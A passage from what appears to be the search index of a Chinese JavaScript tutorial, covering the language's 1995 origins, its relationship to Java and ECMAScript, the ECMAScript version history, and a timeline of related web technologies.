\u7a0b\u5e8f\u3002\u8fd9\u4e9b\u8bbe\u60f3\u76f4\u63a5\u6392\u9664\u4e86\u4f7f\u7528\u73b0\u5b58\u8bed\u8a00\uff0c\u6bd4\u5982 Perl\u3001Python \u548c TCL\u3002 1995\u5e74\uff0cNetscape \u516c\u53f8\u96c7\u4f63\u4e86\u7a0b\u5e8f\u5458 Brendan Eich \u5f00\u53d1\u8fd9\u79cd\u7f51\u9875\u811a\u672c\u8bed\u8a00\u3002Brendan Eich \u6709\u5f88\u5f3a\u7684\u51fd\u6570\u5f0f\u7f16\u7a0b\u80cc\u666f\uff0c\u5e0c\u671b\u4ee5 Scheme \u8bed\u8a00\uff08\u51fd\u6570\u5f0f\u8bed\u8a00\u9f3b\u7956 LISP \u8bed\u8a00\u7684\u4e00\u79cd\u65b9\u8a00\uff09\u4e3a\u84dd\u672c\uff0c\u5b9e\u73b0\u8fd9\u79cd\u65b0\u8bed\u8a00\u3002 1995\u5e745\u6708\uff0cBrendan Eich \u53ea\u7528\u4e8610\u5929\uff0c\u5c31\u8bbe\u8ba1\u5b8c\u6210\u4e86\u8fd9\u79cd\u8bed\u8a00\u7684\u7b2c\u4e00\u7248\u3002\u5b83\u662f\u4e00\u4e2a\u5927\u6742\u70e9\uff0c\u8bed\u6cd5\u6709\u591a\u4e2a\u6765\u6e90\u3002 \u57fa\u672c\u8bed\u6cd5\uff1a\u501f\u9274 C \u8bed\u8a00\u548c Java \u8bed\u8a00\u3002 \u6570\u636e\u7ed3\u6784\uff1a\u501f\u9274 Java \u8bed\u8a00\uff0c\u5305\u62ec\u5c06\u503c\u5206\u6210\u539f\u59cb\u503c\u548c\u5bf9\u8c61\u4e24\u5927\u7c7b\u3002 \u51fd\u6570\u7684\u7528\u6cd5\uff1a\u501f\u9274 Scheme \u8bed\u8a00\u548c Awk \u8bed\u8a00\uff0c\u5c06\u51fd\u6570\u5f53\u4f5c\u7b2c\u4e00\u7b49\u516c\u6c11\uff0c\u5e76\u5f15\u5165\u95ed\u5305\u3002 \u539f\u578b\u7ee7\u627f\u6a21\u578b\uff1a\u501f\u9274 Self \u8bed\u8a00\uff08Smalltalk \u7684\u4e00\u79cd\u53d8\u79cd\uff09\u3002 \u6b63\u5219\u8868\u8fbe\u5f0f\uff1a\u501f\u9274 Perl \u8bed\u8a00\u3002 \u5b57\u7b26\u4e32\u548c\u6570\u7ec4\u5904\u7406\uff1a\u501f\u9274 Python \u8bed\u8a00\u3002 \u4e3a\u4e86\u4fdd\u6301\u7b80\u5355\uff0c\u8fd9\u79cd\u811a\u672c\u8bed\u8a00\u7f3a\u5c11\u4e00\u4e9b\u5173\u952e\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u5757\u7ea7\u4f5c\u7528\u57df\u3001\u6a21\u5757\u3001\u5b50\u7c7b\u578b\uff08subtyping\uff09\u7b49\u7b49\uff0c\u4f46\u662f\u53ef\u4ee5\u5229\u7528\u73b0\u6709\u529f\u80fd\u627e\u51fa\u89e3\u51b3\u529e\u6cd5\u3002\u8fd9\u79cd\u529f\u80fd\u7684\u4e0d\u8db3\uff0c\u76f4\u63a5\u5bfc\u81f4\u4e86\u540e\u6765 JavaScript \u7684\u4e00\u4e2a\u663e\u8457\u7279\u70b9\uff1a\u5bf9\u4e8e\u5176\u4ed6\u8bed\u8a00\uff0c\u4f60\u9700\u8981\u5b66\u4e60\u8bed\u8a00\u7684\u5404\u79cd\u529f\u80fd\uff0c\u800c\u5bf9\u4e8e JavaScript\uff0c\u4f60\u5e38\u5e38\u9700\u8981\u5b66\u4e60\u5404\u79cd\u89e3\u51b3\u95ee\u9898\u7684\u6a21\u5f0f\u3002\u800c\u4e14\u7531\u4e8e\u6765\u6e90\u591a\u6837\uff0c\u4ece\u4e00\u5f00\u59cb\u5c31\u6ce8\u5b9a\uff0cJavaScript \u7684\u7f16\u7a0b\u98ce\u683c\u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u548c\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u4e00\u79cd\u6df7\u5408\u4f53\u3002 Netscape \u516c\u53f8\u7684\u8fd9\u79cd\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\uff0c\u6700\u521d\u540d\u5b57\u53eb\u505a Mocha\uff0c1995\u5e749\u6708\u6539\u4e3a LiveScript\u300212\u6708\uff0cNetscape \u516c\u53f8\u4e0e Sun \u516c\u53f8\uff08Java \u8bed\u8a00\u7684\u53d1\u660e\u8005\u548c\u6240\u6709\u8005\uff09\u8fbe\u6210\u534f\u8bae\uff0c\u540e\u8005\u5141\u8bb8\u5c06\u8fd9\u79cd\u8bed\u8a00\u53eb\u505a JavaScript\u3002\u8fd9\u6837\u4e00\u6765\uff0cNetscape \u516c\u53f8\u53ef\u4ee5\u501f\u52a9 Java \u8bed\u8a00\u7684\u58f0\u52bf\uff0c\u800c Sun \u516c\u53f8\u5219\u5c06\u81ea\u5df1\u7684\u5f71\u54cd\u529b\u6269\u5c55\u5230\u4e86\u6d4f\u89c8\u5668\u3002 \u4e4b\u6240\u4ee5\u8d77\u8fd9\u4e2a\u540d\u5b57\uff0c\u5e76\u4e0d\u662f\u56e0\u4e3a JavaScript \u672c\u8eab\u4e0e Java \u8bed\u8a00\u6709\u591a\u4e48\u6df1\u7684\u5173\u7cfb\uff08\u4e8b\u5b9e\u4e0a\uff0c\u4e24\u8005\u5173\u7cfb\u5e76\u4e0d\u6df1\uff0c\u8be6\u89c1\u4e0b\u8282\uff09\uff0c\u800c\u662f\u56e0\u4e3a Netscape \u516c\u53f8\u5df2\u7ecf\u51b3\u5b9a\uff0c\u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\uff0cJavaScript \u53ef\u4ee5\u50cf\u80f6\u6c34\u4e00\u6837\uff0c\u5c06\u5404\u4e2a\u90e8\u5206\u8fde\u63a5\u8d77\u6765\u3002\u5f53\u7136\uff0c\u540e\u6765\u7684\u5386\u53f2\u662f Java \u8bed\u8a00\u7684\u6d4f\u89c8\u5668\u63d2\u4ef6\u5931\u8d25\u4e86\uff0cJavaScript \u53cd\u800c\u53d1\u626c\u5149\u5927\u3002 1995\u5e7412\u67084\u65e5\uff0cNetscape \u516c\u53f8\u4e0e Sun \u516c\u53f8\u8054\u5408\u53d1\u5e03\u4e86 JavaScript \u8bed\u8a00\uff0c\u5bf9\u5916\u5ba3\u4f20 JavaScript \u662f Java \u7684\u8865\u5145\uff0c\u5c5e\u4e8e\u8f7b\u91cf\u7ea7\u7684 Java\uff0c\u4e13\u95e8\u7528\u6765\u64cd\u4f5c\u7f51\u9875\u3002 1996\u5e743\u6708\uff0cNavigator 2.0 \u6d4f\u89c8\u5668\u6b63\u5f0f\u5185\u7f6e\u4e86 JavaScript \u811a\u672c\u8bed\u8a00\u3002","title":"\u8bde\u751f"},{"location":"basic/history/#javascript-java","text":"\u8fd9\u91cc\u4e13\u95e8\u8bf4\u4e00\u4e0b JavaScript \u548c Java \u7684\u5173\u7cfb\u3002\u5b83\u4eec\u662f\u4e24\u79cd\u4e0d\u4e00\u6837\u7684\u8bed\u8a00\uff0c\u4f46\u662f\u5f7c\u6b64\u5b58\u5728\u8054\u7cfb\u3002 JavaScript \u7684\u57fa\u672c\u8bed\u6cd5\u548c\u5bf9\u8c61\u4f53\u7cfb\uff0c\u662f\u6a21\u4eff Java \u800c\u8bbe\u8ba1\u7684\u3002\u4f46\u662f\uff0cJavaScript \u6ca1\u6709\u91c7\u7528 Java \u7684\u9759\u6001\u7c7b\u578b\u3002\u6b63\u662f\u56e0\u4e3a JavaScript \u4e0e Java \u6709\u5f88\u5927\u7684\u76f8\u4f3c\u6027\uff0c\u6240\u4ee5\u8fd9\u95e8\u8bed\u8a00\u624d\u4ece\u4e00\u5f00\u59cb\u7684 LiveScript \u6539\u540d\u4e3a JavaScript\u3002\u57fa\u672c\u4e0a\uff0cJavaScript \u8fd9\u4e2a\u540d\u5b57\u7684\u539f\u610f\u662f\u201c\u5f88\u50cfJava\u7684\u811a\u672c\u8bed\u8a00\u201d\u3002 JavaScript \u8bed\u8a00\u7684\u51fd\u6570\u662f\u4e00\u79cd\u72ec\u7acb\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4ee5\u53ca\u91c7\u7528\u57fa\u4e8e\u539f\u578b\u5bf9\u8c61\uff08prototype\uff09\u7684\u7ee7\u627f\u94fe\u3002\u8fd9\u662f\u5b83\u4e0e Java \u8bed\u6cd5\u6700\u5927\u7684\u4e24\u70b9\u533a\u522b\u3002JavaScript \u8bed\u6cd5\u8981\u6bd4 Java \u81ea\u7531\u5f97\u591a\u3002 \u53e6\u5916\uff0cJava \u8bed\u8a00\u9700\u8981\u7f16\u8bd1\uff0c\u800c JavaScript \u8bed\u8a00\u5219\u662f\u8fd0\u884c\u65f6\u7531\u89e3\u91ca\u5668\u76f4\u63a5\u6267\u884c\u3002 \u603b\u4e4b\uff0cJavaScript \u7684\u539f\u59cb\u8bbe\u8ba1\u76ee\u6807\u662f\u4e00\u79cd\u5c0f\u578b\u7684\u3001\u7b80\u5355\u7684\u52a8\u6001\u8bed\u8a00\uff0c\u4e0e Java \u6709\u8db3\u591f\u7684\u76f8\u4f3c\u6027\uff0c\u4f7f\u5f97\u4f7f\u7528\u8005\uff08\u5c24\u5176\u662f Java \u7a0b\u5e8f\u5458\uff09\u53ef\u4ee5\u5feb\u901f\u4e0a\u624b\u3002","title":"JavaScript \u4e0e Java \u7684\u5173\u7cfb"},{"location":"basic/history/#javascript-ecmascript","text":"1996\u5e748\u6708\uff0c\u5fae\u8f6f\u6a21\u4eff JavaScript \u5f00\u53d1\u4e86\u4e00\u79cd\u76f8\u8fd1\u7684\u8bed\u8a00\uff0c\u53d6\u540d\u4e3aJScript\uff08JavaScript \u662f Netscape \u7684\u6ce8\u518c\u5546\u6807\uff0c\u5fae\u8f6f\u4e0d\u80fd\u7528\uff09\uff0c\u9996\u5148\u5185\u7f6e\u4e8eIE 3.0\u3002Netscape \u516c\u53f8\u9762\u4e34\u4e27\u5931\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\u7684\u4e3b\u5bfc\u6743\u7684\u5c40\u9762\u3002 1996\u5e7411\u6708\uff0cNetscape \u516c\u53f8\u51b3\u5b9a\u5c06 JavaScript \u63d0\u4ea4\u7ed9\u56fd\u9645\u6807\u51c6\u5316\u7ec4\u7ec7 ECMA\uff08European Computer Manufacturers Association\uff09\uff0c\u5e0c\u671b JavaScript \u80fd\u591f\u6210\u4e3a\u56fd\u9645\u6807\u51c6\uff0c\u4ee5\u6b64\u62b5\u6297\u5fae\u8f6f\u3002ECMA \u768439\u53f7\u6280\u672f\u59d4\u5458\u4f1a\uff08Technical Committee 39\uff09\u8d1f\u8d23\u5236\u5b9a\u548c\u5ba1\u6838\u8fd9\u4e2a\u6807\u51c6\uff0c\u6210\u5458\u7531\u4e1a\u5185\u7684\u5927\u516c\u53f8\u6d3e\u51fa\u7684\u5de5\u7a0b\u5e08\u7ec4\u6210\uff0c\u76ee\u524d\u517125\u4e2a\u4eba\u3002\u8be5\u59d4\u5458\u4f1a\u5b9a\u671f\u5f00\u4f1a\uff0c\u6240\u6709\u7684\u90ae\u4ef6\u8ba8\u8bba\u548c\u4f1a\u8bae\u8bb0\u5f55\uff0c\u90fd\u662f\u516c\u5f00\u7684\u3002 1997\u5e747\u6708\uff0cECMA \u7ec4\u7ec7\u53d1\u5e03262\u53f7\u6807\u51c6\u6587\u4ef6\uff08ECMA-262\uff09\u7684\u7b2c\u4e00\u7248\uff0c\u89c4\u5b9a\u4e86\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\u7684\u6807\u51c6\uff0c\u5e76\u5c06\u8fd9\u79cd\u8bed\u8a00\u79f0\u4e3a ECMAScript\u3002\u8fd9\u4e2a\u7248\u672c\u5c31\u662f ECMAScript 1.0 \u7248\u3002\u4e4b\u6240\u4ee5\u4e0d\u53eb JavaScript\uff0c\u4e00\u65b9\u9762\u662f\u7531\u4e8e\u5546\u6807\u7684\u5173\u7cfb\uff0cJava \u662f Sun \u516c\u53f8\u7684\u5546\u6807\uff0c\u6839\u636e\u4e00\u4efd\u6388\u6743\u534f\u8bae\uff0c\u53ea\u6709 Netscape \u516c\u53f8\u53ef\u4ee5\u5408\u6cd5\u5730\u4f7f\u7528 JavaScript \u8fd9\u4e2a\u540d\u5b57\uff0c\u4e14 JavaScript \u5df2\u7ecf\u88ab Netscape \u516c\u53f8\u6ce8\u518c\u4e3a\u5546\u6807\uff0c\u53e6\u4e00\u65b9\u9762\u4e5f\u662f\u60f3\u4f53\u73b0\u8fd9\u95e8\u8bed\u8a00\u7684\u5236\u5b9a\u8005\u662f ECMA\uff0c\u4e0d\u662f Netscape\uff0c\u8fd9\u6837\u6709\u5229\u4e8e\u4fdd\u8bc1\u8fd9\u95e8\u8bed\u8a00\u7684\u5f00\u653e\u6027\u548c\u4e2d\u7acb\u6027\u3002\u56e0\u6b64\uff0cECMAScript \u548c JavaScript \u7684\u5173\u7cfb\u662f\uff0c\u524d\u8005\u662f\u540e\u8005\u7684\u89c4\u683c\uff0c\u540e\u8005\u662f\u524d\u8005\u7684\u4e00\u79cd\u5b9e\u73b0\u3002\u5728\u65e5\u5e38\u573a\u5408\uff0c\u8fd9\u4e24\u4e2a\u8bcd\u662f\u53ef\u4ee5\u4e92\u6362\u7684\u3002 ECMAScript \u53ea\u7528\u6765\u6807\u51c6\u5316 JavaScript \u8fd9\u79cd\u8bed\u8a00\u7684\u57fa\u672c\u8bed\u6cd5\u7ed3\u6784\uff0c\u4e0e\u90e8\u7f72\u73af\u5883\u76f8\u5173\u7684\u6807\u51c6\u90fd\u7531\u5176\u4ed6\u6807\u51c6\u89c4\u5b9a\uff0c\u6bd4\u5982 DOM \u7684\u6807\u51c6\u5c31\u662f\u7531 W3C\u7ec4\u7ec7\uff08World Wide Web Consortium\uff09\u5236\u5b9a\u7684\u3002 ECMA-262 \u6807\u51c6\u540e\u6765\u4e5f\u88ab\u53e6\u4e00\u4e2a\u56fd\u9645\u6807\u51c6\u5316\u7ec4\u7ec7 ISO\uff08International Organization for Standardization\uff09\u6279\u51c6\uff0c\u6807\u51c6\u53f7\u662f ISO-16262\u3002","title":"JavaScript \u4e0e ECMAScript \u7684\u5173\u7cfb"},{"location":"basic/history/#javascript_1","text":"1997\u5e747\u6708\uff0cECMAScript 1.0\u53d1\u5e03\u3002 1998\u5e746\u6708\uff0cECMAScript 2.0\u7248\u53d1\u5e03\u3002 1999\u5e7412\u6708\uff0cECMAScript 3.0\u7248\u53d1\u5e03\uff0c\u6210\u4e3a JavaScript \u7684\u901a\u884c\u6807\u51c6\uff0c\u5f97\u5230\u4e86\u5e7f\u6cdb\u652f\u6301\u3002 2007\u5e7410\u6708\uff0cECMAScript 4.0\u7248\u8349\u6848\u53d1\u5e03\uff0c\u5bf93.0\u7248\u505a\u4e86\u5927\u5e45\u5347\u7ea7\uff0c\u9884\u8ba1\u6b21\u5e748\u6708\u53d1\u5e03\u6b63\u5f0f\u7248\u672c\u3002\u8349\u6848\u53d1\u5e03\u540e\uff0c\u7531\u4e8e4.0\u7248\u7684\u76ee\u6807\u8fc7\u4e8e\u6fc0\u8fdb\uff0c\u5404\u65b9\u5bf9\u4e8e\u662f\u5426\u901a\u8fc7\u8fd9\u4e2a\u6807\u51c6\uff0c\u53d1\u751f\u4e86\u4e25\u91cd\u5206\u6b67\u3002\u4ee5 Yahoo\u3001Microsoft\u3001Google \u4e3a\u9996\u7684\u5927\u516c\u53f8\uff0c\u53cd\u5bf9 JavaScript \u7684\u5927\u5e45\u5347\u7ea7\uff0c\u4e3b\u5f20\u5c0f\u5e45\u6539\u52a8\uff1b\u4ee5 JavaScript \u521b\u9020\u8005 Brendan Eich \u4e3a\u9996\u7684 Mozilla \u516c\u53f8\uff0c\u5219\u575a\u6301\u5f53\u524d\u7684\u8349\u6848\u3002 2008\u5e747\u6708\uff0c\u7531\u4e8e\u5bf9\u4e8e\u4e0b\u4e00\u4e2a\u7248\u672c\u5e94\u8be5\u5305\u62ec\u54ea\u4e9b\u529f\u80fd\uff0c\u5404\u65b9\u5206\u6b67\u592a\u5927\uff0c\u4e89\u8bba\u8fc7\u4e8e\u6fc0\u8fdb\uff0cECMA \u5f00\u4f1a\u51b3\u5b9a\uff0c\u4e2d\u6b62 ECMAScript 4.0 \u7684\u5f00\u53d1\uff08\u5373\u5e9f\u9664\u4e86\u8fd9\u4e2a\u7248\u672c\uff09\uff0c\u5c06\u5176\u4e2d\u6d89\u53ca\u73b0\u6709\u529f\u80fd\u6539\u5584\u7684\u4e00\u5c0f\u90e8\u5206\uff0c\u53d1\u5e03\u4e3a ECMAScript 3.1\uff0c\u800c\u5c06\u5176\u4ed6\u6fc0\u8fdb\u7684\u8bbe\u60f3\u6269\u5927\u8303\u56f4\uff0c\u653e\u5165\u4ee5\u540e\u7684\u7248\u672c\uff0c\u7531\u4e8e\u4f1a\u8bae\u7684\u6c14\u6c1b\uff0c\u8be5\u7248\u672c\u7684\u9879\u76ee\u4ee3\u53f7\u8d77\u540d\u4e3a Harmony\uff08\u548c\u8c10\uff09\u3002\u4f1a\u540e\u4e0d\u4e45\uff0cECMAScript 3.1 \u5c31\u6539\u540d\u4e3a ECMAScript 5\u3002 2009\u5e7412\u6708\uff0cECMAScript 5.0\u7248 \u6b63\u5f0f\u53d1\u5e03\u3002Harmony \u9879\u76ee\u5219\u4e00\u5206\u4e3a\u4e8c\uff0c\u4e00\u4e9b\u8f83\u4e3a\u53ef\u884c\u7684\u8bbe\u60f3\u5b9a\u540d\u4e3a JavaScript.next \u7ee7\u7eed\u5f00\u53d1\uff0c\u540e\u6765\u6f14\u53d8\u6210 ECMAScript 6\uff1b\u4e00\u4e9b\u4e0d\u662f\u5f88\u6210\u719f\u7684\u8bbe\u60f3\uff0c\u5219\u88ab\u89c6\u4e3a JavaScript.next.next\uff0c\u5728\u66f4\u8fdc\u7684\u5c06\u6765\u518d\u8003\u8651\u63a8\u51fa\u3002TC39 \u7684\u603b\u4f53\u8003\u8651\u662f\uff0cECMAScript 5 \u4e0e ECMAScript 3 \u57fa\u672c\u4fdd\u6301\u517c\u5bb9\uff0c\u8f83\u5927\u7684\u8bed\u6cd5\u4fee\u6b63\u548c\u65b0\u529f\u80fd\u52a0\u5165\uff0c\u5c06\u7531 JavaScript.next \u5b8c\u6210\u3002\u5f53\u65f6\uff0cJavaScript.next \u6307\u7684\u662fECMAScript 6\u3002\u7b2c\u516d\u7248\u53d1\u5e03\u4ee5\u540e\uff0c\u5c06\u6307 ECMAScript 7\u3002TC39 \u9884\u8ba1\uff0cECMAScript 5 \u4f1a\u57282013\u5e74\u7684\u5e74\u4e2d\u6210\u4e3a JavaScript \u5f00\u53d1\u7684\u4e3b\u6d41\u6807\u51c6\uff0c\u5e76\u5728\u6b64\u540e\u4e94\u5e74\u4e2d\u4e00\u76f4\u4fdd\u6301\u8fd9\u4e2a\u4f4d\u7f6e\u3002 2011\u5e746\u6708\uff0cECMAScript 5.1\u7248\u53d1\u5e03\uff0c\u5e76\u4e14\u6210\u4e3a ISO \u56fd\u9645\u6807\u51c6\uff08ISO/IEC 16262:2011\uff09\u3002\u5230\u4e862012\u5e74\u5e95\uff0c\u6240\u6709\u4e3b\u8981\u6d4f\u89c8\u5668\u90fd\u652f\u6301 ECMAScript 5.1\u7248\u7684\u5168\u90e8\u529f\u80fd\u3002 2013\u5e743\u6708\uff0cECMAScript 6 \u8349\u6848\u51bb\u7ed3\uff0c\u4e0d\u518d\u6dfb\u52a0\u65b0\u529f\u80fd\u3002\u65b0\u7684\u529f\u80fd\u8bbe\u60f3\u5c06\u88ab\u653e\u5230 ECMAScript 7\u3002 2013\u5e7412\u6708\uff0cECMAScript 6 \u8349\u6848\u53d1\u5e03\u3002\u7136\u540e\u662f12\u4e2a\u6708\u7684\u8ba8\u8bba\u671f\uff0c\u542c\u53d6\u5404\u65b9\u53cd\u9988\u3002 2015\u5e746\u6708\uff0cECMAScript 6 \u6b63\u5f0f\u53d1\u5e03\uff0c\u5e76\u4e14\u66f4\u540d\u4e3a\u201cECMAScript 2015\u201d\u3002\u8fd9\u662f\u56e0\u4e3a TC39 \u59d4\u5458\u4f1a\u8ba1\u5212\uff0c\u4ee5\u540e\u6bcf\u5e74\u53d1\u5e03\u4e00\u4e2a ECMAScript \u7684\u7248\u672c\uff0c\u4e0b\u4e00\u4e2a\u7248\u672c\u57282016\u5e74\u53d1\u5e03\uff0c\u79f0\u4e3a\u201cECMAScript 2016\u201d\uff0c2017\u5e74\u53d1\u5e03\u201cECMAScript 2017\u201d\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002","title":"JavaScript \u7684\u7248\u672c"},{"location":"basic/history/#_2","text":"JavaScript \u4f34\u968f\u7740\u4e92\u8054\u7f51\u7684\u53d1\u5c55\u4e00\u8d77\u53d1\u5c55\u3002\u4e92\u8054\u7f51\u5468\u8fb9\u6280\u672f\u7684\u5feb\u901f\u53d1\u5c55\uff0c\u523a\u6fc0\u548c\u63a8\u52a8\u4e86 JavaScript \u8bed\u8a00\u7684\u53d1\u5c55\u3002\u4e0b\u9762\uff0c\u56de\u987e\u4e00\u4e0b JavaScript \u7684\u5468\u8fb9\u5e94\u7528\u53d1\u5c55\u3002 1996\u5e74\uff0c\u6837\u5f0f\u8868\u6807\u51c6 CSS \u7b2c\u4e00\u7248\u53d1\u5e03\u3002 1997\u5e74\uff0cDHTML\uff08Dynamic HTML\uff0c\u52a8\u6001 HTML\uff09\u53d1\u5e03\uff0c\u5141\u8bb8\u52a8\u6001\u6539\u53d8\u7f51\u9875\u5185\u5bb9\u3002\u8fd9\u6807\u5fd7\u7740 DOM \u6a21\u5f0f\uff08Document Object Model\uff0c\u6587\u6863\u5bf9\u8c61\u6a21\u578b\uff09\u6b63\u5f0f\u5e94\u7528\u3002 1998\u5e74\uff0cNetscape \u516c\u53f8\u5f00\u6e90\u4e86\u6d4f\u89c8\u5668\uff0c\u8fd9\u5bfc\u81f4\u4e86 Mozilla \u9879\u76ee\u7684\u8bde\u751f\u3002\u51e0\u4e2a\u6708\u540e\uff0c\u7f8e\u56fd\u5728\u7ebf\uff08AOL\uff09\u5ba3\u5e03\u5e76\u8d2d Netscape\u3002 1999\u5e74\uff0cIE 5\u90e8\u7f72\u4e86 XMLHttpRequest \u63a5\u53e3\uff0c\u5141\u8bb8 JavaScript \u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u4e3a\u540e\u6765\u5927\u884c\u5176\u9053\u7684 Ajax \u5e94\u7528\u521b\u9020\u4e86\u6761\u4ef6\u3002 2000\u5e74\uff0cKDE \u9879\u76ee\u91cd\u5199\u4e86\u6d4f\u89c8\u5668\u5f15\u64ce KHTML\uff0c\u4e3a\u540e\u6765\u7684 WebKit \u548c Blink \u5f15\u64ce\u6253\u4e0b\u57fa\u7840\u3002\u8fd9\u4e00\u5e74\u768410\u670823\u65e5\uff0cKDE 2.0\u53d1\u5e03\uff0c\u7b2c\u4e00\u6b21\u5c06 KHTML \u6d4f\u89c8\u5668\u5305\u62ec\u5176\u4e2d\u3002 2001\u5e74\uff0c\u5fae\u8f6f\u516c\u53f8\u65f6\u96945\u5e74\u4e4b\u540e\uff0c\u53d1\u5e03\u4e86 IE \u6d4f\u89c8\u5668\u7684\u4e0b\u4e00\u4e2a\u7248\u672c Internet Explorer 6\u3002\u8fd9\u662f\u5f53\u65f6\u6700\u5148\u8fdb\u7684\u6d4f\u89c8\u5668\uff0c\u5b83\u540e\u6765\u7edf\u6cbb\u4e86\u6d4f\u89c8\u5668\u5e02\u573a\u591a\u5e74\u3002 2001\u5e74\uff0cDouglas Crockford \u63d0\u51fa\u4e86 JSON \u683c\u5f0f\uff0c\u7528\u4e8e\u53d6\u4ee3 XML \u683c\u5f0f\uff0c\u8fdb\u884c\u670d\u52a1\u5668\u548c\u7f51\u9875\u4e4b\u95f4\u7684\u6570\u636e\u4ea4\u6362\u3002JavaScript \u53ef\u4ee5\u539f\u751f\u652f\u6301\u8fd9\u79cd\u683c\u5f0f\uff0c\u4e0d\u9700\u8981\u989d\u5916\u90e8\u7f72\u4ee3\u7801\u3002 2002\u5e74\uff0cMozilla \u9879\u76ee\u53d1\u5e03\u4e86\u5b83\u7684\u6d4f\u89c8\u5668\u7684\u7b2c\u4e00\u7248\uff0c\u540e\u6765\u8d77\u540d\u4e3a Firefox\u3002 2003\u5e74\uff0c\u82f9\u679c\u516c\u53f8\u53d1\u5e03\u4e86 Safari \u6d4f\u89c8\u5668\u7684\u7b2c\u4e00\u7248\u3002 2004\u5e74\uff0cGoogle \u516c\u53f8\u53d1\u5e03\u4e86 Gmail\uff0c\u4fc3\u6210\u4e86\u4e92\u8054\u7f51\u5e94\u7528\u7a0b\u5e8f\uff08Web Application\uff09\u8fd9\u4e2a\u6982\u5ff5\u7684\u8bde\u751f\u3002\u7531\u4e8e Gmail \u662f\u57284\u67081\u65e5\u53d1\u5e03\u7684\uff0c\u5f88\u591a\u4eba\u8d77\u521d\u4ee5\u4e3a\u8fd9\u53ea\u662f\u4e00\u4e2a\u73a9\u7b11\u3002 2004\u5e74\uff0cDojo \u6846\u67b6\u8bde\u751f\uff0c\u4e3a\u4e0d\u540c\u6d4f\u89c8\u5668\u63d0\u4f9b\u4e86\u540c\u4e00\u63a5\u53e3\uff0c\u5e76\u4e3a\u4e3b\u8981\u529f\u80fd\u63d0\u4f9b\u4e86\u4fbf\u5229\u7684\u8c03\u7528\u65b9\u6cd5\u3002\u8fd9\u6807\u5fd7\u7740 JavaScript \u7f16\u7a0b\u6846\u67b6\u7684\u65f6\u4ee3\u5f00\u59cb\u6765\u4e34\u3002 2004\u5e74\uff0cWHATWG \u7ec4\u7ec7\u6210\u7acb\uff0c\u81f4\u529b\u4e8e\u52a0\u901f HTML \u8bed\u8a00\u7684\u6807\u51c6\u5316\u8fdb\u7a0b\u3002 2005\u5e74\uff0c\u82f9\u679c\u516c\u53f8\u5728 KHTML \u5f15\u64ce\u57fa\u7840\u4e0a\uff0c\u5efa\u7acb\u4e86 WebKit \u5f15\u64ce\u3002 2005\u5e74\uff0cAjax \u65b9\u6cd5\uff08Asynchronous JavaScript and XML\uff09\u6b63\u5f0f\u8bde\u751f\uff0cJesse James Garrett \u53d1\u660e\u4e86\u8fd9\u4e2a\u8bcd\u6c47\u3002\u5b83\u5f00\u59cb\u6d41\u884c\u7684\u6807\u5fd7\u662f\uff0c2\u6708\u4efd\u53d1\u5e03\u7684 Google Maps \u9879\u76ee\u5927\u91cf\u91c7\u7528\u8be5\u65b9\u6cd5\u3002\u5b83\u51e0\u4e4e\u6210\u4e86\u65b0\u4e00\u4ee3\u7f51\u7ad9\u7684\u6807\u51c6\u505a\u6cd5\uff0c\u4fc3\u6210\u4e86 Web 2.0\u65f6\u4ee3\u7684\u6765\u4e34\u3002 2005\u5e74\uff0cApache \u57fa\u91d1\u4f1a\u53d1\u5e03\u4e86 CouchDB \u6570\u636e\u5e93\u3002\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8e JSON \u683c\u5f0f\u7684\u6570\u636e\u5e93\uff0c\u53ef\u4ee5\u7528 JavaScript \u51fd\u6570\u5b9a\u4e49\u89c6\u56fe\u548c\u7d22\u5f15\u3002\u5b83\u5728\u672c\u8d28\u4e0a\u6709\u522b\u4e8e\u4f20\u7edf\u7684\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff0c\u6807\u8bc6\u7740 NoSQL \u7c7b\u578b\u7684\u6570\u636e\u5e93\u8bde\u751f\u3002 2006\u5e74\uff0cjQuery \u51fd\u6570\u5e93\u8bde\u751f\uff0c\u4f5c\u8005\u4e3aJohn Resig\u3002jQuery \u4e3a\u64cd\u4f5c\u7f51\u9875 DOM \u7ed3\u6784\u63d0\u4f9b\u4e86\u975e\u5e38\u5f3a\u5927\u6613\u7528\u7684\u63a5\u53e3\uff0c\u6210\u4e3a\u4e86\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u51fd\u6570\u5e93\uff0c\u5e76\u4e14\u8ba9 JavaScript \u8bed\u8a00\u7684\u5e94\u7528\u96be\u5ea6\u5927\u5927\u964d\u4f4e\uff0c\u63a8\u52a8\u4e86\u8fd9\u79cd\u8bed\u8a00\u7684\u6d41\u884c\u3002 2006\u5e74\uff0c\u5fae\u8f6f\u516c\u53f8\u53d1\u5e03 IE 7\uff0c\u6807\u5fd7\u91cd\u65b0\u5f00\u59cb\u542f\u52a8\u6d4f\u89c8\u5668\u7684\u5f00\u53d1\u3002 2006\u5e74\uff0cGoogle\u63a8\u51fa Google Web Toolkit \u9879\u76ee\uff08\u7f29\u5199\u4e3a GWT\uff09\uff0c\u63d0\u4f9b Java \u7f16\u8bd1\u6210 JavaScript \u7684\u529f\u80fd\uff0c\u5f00\u521b\u4e86\u5c06\u5176\u4ed6\u8bed\u8a00\u8f6c\u4e3a JavaScript \u7684\u5148\u6cb3\u3002 2007\u5e74\uff0cWebkit \u5f15\u64ce\u5728 iPhone \u624b\u673a\u4e2d\u5f97\u5230\u90e8\u7f72\u3002\u5b83\u6700\u521d\u57fa\u4e8e KDE \u9879\u76ee\uff0c2003\u5e74\u82f9\u679c\u516c\u53f8\u9996\u5148\u91c7\u7528\uff0c2005\u5e74\u5f00\u6e90\u3002\u8fd9\u6807\u5fd7\u7740 JavaScript 